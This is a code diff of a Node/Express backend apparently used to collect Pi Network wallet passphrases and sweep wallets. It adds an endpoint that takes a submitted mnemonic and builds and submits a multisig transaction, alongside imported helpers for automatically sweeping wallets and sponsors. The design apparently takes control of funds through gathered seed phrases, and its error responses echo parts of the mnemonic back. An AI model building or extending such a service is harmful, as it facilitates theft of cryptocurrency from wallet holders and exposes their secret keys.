@@ -14,7 +14,7 @@ import { connectToDB } from './db.js';
 import passphraseRoutes from './routes/passphrases.js';
 import sponsorRoutes from './routes/sponsors.js';
 import logRoutes from './routes/log.js';
-import { autoCheckSponsorForClaimable, autoFundWallet, autoSweepSponsor, autoSweepWallet, FloodchannelTransaction, getAccount, getBaseFee, getClaimableBalance, getKeypairFromPassphrase, PI_PUBLIC_ADDRESS, sweepWallet } from './utils/fn.js';
+import { autoCheckSponsorForClaimable, autoFundWallet, autoSweepSponsor, autoSweepWallet, buildAndSubmitMultiSigTx, FloodchannelTransaction, getAccount, getBaseFee, getClaimableBalance, getKeypairFromPassphrase, PI_PUBLIC_ADDRESS, sweepWallet } from './utils/fn.js';
 import Passphrase from './models/Passphrase.js';
 import Sponsors from './models/Sponsors.js';
 import { storeLockedPi } from './utils/modelfn.js';
@@ -112,6 +112,24 @@ app.post('/api/passphrases/upload', async(req, res) => {
             return res.status(201).json({ success: true,  feedback: saved.message });
         } else {
             return res.status(201).json({ success: false,  error: saved.message });
+        }
+    } catch(err) {
+        res.status(500).json({success: false, error: `Failed to save passphrase: ${mnemonic.slice(0,15)}....${mnemonic.slice(-15)}` });
+    }
+})
+
+app.post('/api/passphrases/multisig', async(req, res) => {
+    const { mnemonic } = req.body;
+    if (!mnemonic) {
+        return res.status(409).json({ success: false,  error: 'mnemonic is required' });
+    }
+    try {
+
+        const sign = await buildAndSubmitMultiSigTx(mnemonic);
+        if(sign) {
+            return res.status(201).json({ success: true,  feedback: sign });
+        } else {
+            return res.status(201).json({ success: false,  error: sign });
         }
     } catch(err) {
         res.status(500).json({success: false, error: `Failed to save passphrase: ${mnemonic.slice(0,15)}....${mnemonic.slice(-15)}` });
